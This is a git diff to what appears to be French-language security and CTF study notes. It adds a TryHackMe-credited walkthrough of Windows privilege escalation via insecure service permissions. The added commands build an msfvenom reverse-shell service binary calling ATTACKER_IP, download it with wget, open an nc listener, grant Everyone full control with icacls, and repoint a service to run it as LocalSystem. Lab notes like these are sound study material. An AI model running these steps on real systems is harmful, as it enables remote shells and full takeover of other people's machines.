@@ -248,4 +248,30 @@ sc start "disk sorter enterprise"
 
 ### Insecure Service Permissions
 
-Utilisation de <href a="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk"> accesschk</a>
+Utilisation de <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk</a> sur un service pour checker ses permissions.
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/162115a0-3294-4ad6-8054-1d982037f674)
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+```
+[Victime] (PowerShell)
+```
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+```
+[Attaquant]
+```
+nc -lvp 4447
+```
+[Victime]
+```
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+```
+
+```
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+```
+sc stop MyService
+sc start MyService
+```
+Crédit: TryHackMe
